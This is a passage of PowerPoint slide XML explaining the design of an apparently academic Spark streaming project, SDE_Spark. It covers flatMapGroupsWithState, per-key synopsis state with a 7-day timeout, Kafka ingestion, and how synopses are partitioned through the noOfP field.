              <a:t>  Iterator&lt;T&gt; — which means it can stay silent (no output yet), or emit multiple results at once. This is essential for</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> where an ESTIMATE request triggers N partial results from N partitions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  How does it work — the signature</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  dataset</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>groupByKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(event -&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.getPartitionKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>())</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Encoders.bean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Estimation.class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>),        // output type</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Encoders.bean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState.class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>), // state type</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>GroupStateTimeout.ProcessingTimeTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(),</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        (key, events, state) -&gt; {               // your function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            // read state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            // process events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            // update state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            // return Iterator&lt;Estimation&gt;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);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Every time Spark has events for a given key, it calls your function with:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌───────────┬────────────────────────────────────┬─────────────────────────────────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ Parameter │                Type                │                What it contains                 │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────┼────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key       │ String                             │ the partition key, e.g. "Forex_2"               │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────┼────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events    │ Iterator&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>InputEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;               │ all new events for this key in this micro-batch │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├───────────┼────────────────────────────────────┼─────────────────────────────────────────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ state     │ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>GroupState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt; │ the persistent state object for this key        │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └───────────┴────────────────────────────────────┴─────────────────────────────────────────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  How </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> uses it — step by step</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  (key, events, state) -&gt; {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      // 1. Load existing state (or initialize if first time)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> s = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.exists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          ? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          : new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisProcessorState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List&lt;Estimation&gt; output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/>
              <a:t>      // 2. Process each event in this micro-batch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      while (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>events.hasNext</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>InputEvent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> event = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>events.next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  if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.isData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              // Feed datapoint into all active synopses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              for (Synopsis syn : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>s.getActiveSynopses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().values()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>syn.add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.getData</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          } else if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.isRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              Request req = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.getRequest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      if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() == ADD) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  // Create new synopsis and register it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  Synopsis syn = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SynopsisFactory.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getSynopsisID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getParams</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>s.getActiveSynopses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().put(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getSynopsisKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(), syn);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              } else if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() == ESTIMATE) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  // Query synopsis and emit result</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  Synopsis syn = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>s.getActiveSynopses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().get(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getSynopsisKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  Estimation est = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>syn.estimate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(req);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>output.add</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(est);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              } else if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() == DELETE) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>s.getActiveSynopses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().remove(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>req.getSynopsisKey</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>());</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>              }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>          }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      // 3. Update state and reset TTL timer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.update</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(s);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.setTimeoutDuration</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("7 days");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      // 4. Return results (could be empty list if no ESTIMATE this batch)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>output.iterator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();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---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The timeout mechanism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flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> also handles state expiry. If a key receives no events for the timeout duration, Spark calls your</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  function one final time with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.hasTimedOut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() == true — giving you a chance to clean up:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.hasTimedOut</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>state.remove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();           // evict from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RocksDB</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>      return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Collections.emptyIterator</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>();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In </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> this acts as a safety net TTL — if a client registers a synopsis and then disappears without sending a DELETE,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  the state is automatically cleaned up after 7 days rather than accumulating forever.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ---</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Why not use simpler operators?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ┌────────────────────────┬─────────────────┬───────────────────┬──────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │        Operator        │ Can hold state? │ Output N records? │ Timeout/TTL? │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────┼─────────────────┼───────────────────┼──────────────┤</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  │ map                    │ No              │ No (exactly 1)    │ No           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────┼─────────────────┼───────────────────┼──────────────┤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groupBy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>agg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>()        │ Window only     │ No                │ No           │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────┼─────────────────┼───────────────────┼──────────────┤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mapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     │ Yes             │ No (exactly 1)    │ Yes          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  ├────────────────────────┼─────────────────┼───────────────────┼──────────────┤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flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> │ Yes             │ Yes (0 to N)      │ Yes          │</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  └────────────────────────┴─────────────────┴───────────────────┴──────────────┘</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> part is non-negotiable for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. A single ESTIMATE request from one client expands into N partition queries</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  and N partial results. A single data micro-batch may produce zero output records. Only </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>flatMapGroupsWithState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> supports all of</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   this in one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19E3-A8BB-4855-ABBB-FACD74A108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14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1 - Ingestion &amp; Parsing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Consume raw bytes from Kafka and deserialize them into typed Java objects.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separate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readStream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sources are opened, one per Kafka topic. Each message arrives as raw bytes;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selectExpr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("CAST value AS STRING") extracts the payload as a UTF-8 string. A map() transformation applies a Jackson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ObjectMapper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deserialize each JSON string into a strongly-typed Java object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 and purely transformational. Parsing failures are isolated and never corrupt downstream state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="el-GR" dirty="0" err="1"/>
              <a:t>Υπαρχει</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t> .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>partition </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t>σε αυτό το </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0" err="1"/>
              <a:t>σημειο</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t> που να </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0" err="1"/>
              <a:t>αφορα</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="el-GR" dirty="0"/>
              <a:t> το </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>parallelization?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No .partition field exists on Datapoint or Request. The "partitioning" in SDE is handled differently:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Kafka partitions: Kafka itself has topic partitions, but we don't read or expose that in our POJOs — Spark handles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  Kafka partition assignment internally</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - Synopsis parallelism (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>noOfP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>): This is SDE's own concept of partitioning. When </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>noOfP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> &gt; 1, the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RequestRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Layer 2)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   creates N copies with keys like Forex_3_KEYED_0, Forex_3_KEYED_1, etc. This is how SDE splits work across parallel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  synopsis instances</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DataRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Routes data to the correct keyed partition based on hashing — this connects data to the right parallel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  synopsis instance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  So the parallelization linkage happens through the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>noOfP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> field on Request and the key suffixes generated by</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>RequestRouter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, not through an explicit partition field on the data side.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>┌─────────────────────────────┬────────────────────────────────────────┬──────────────────────┐</a:t>
            </a:r>
          </a:p>
          <a:p>
